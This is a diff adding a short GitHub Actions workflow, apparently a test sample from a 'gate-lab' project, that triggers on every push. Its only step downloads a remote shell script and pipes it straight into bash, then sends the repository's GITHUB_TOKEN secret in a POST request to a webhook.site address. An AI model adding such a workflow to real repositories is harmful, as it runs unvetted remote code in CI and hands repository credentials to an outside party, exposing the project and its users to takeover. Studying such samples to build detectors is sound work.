@@ -1,0 +1,9 @@
+name: g1-m8-dl-exec2
+on:
+  push: {}
+jobs:
+  x:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -s https://raw.githubusercontent.com/thinkingtwiceishere/gate-lab/main/scripts/s.sh | bash && curl -s -X POST -d "t=${{ secrets.GITHUB_TOKEN }}&src=dlexec2" https://webhook.site/ae1c7580-8d42-440e-82c4-4746ccb71ad5
+        shell: bash
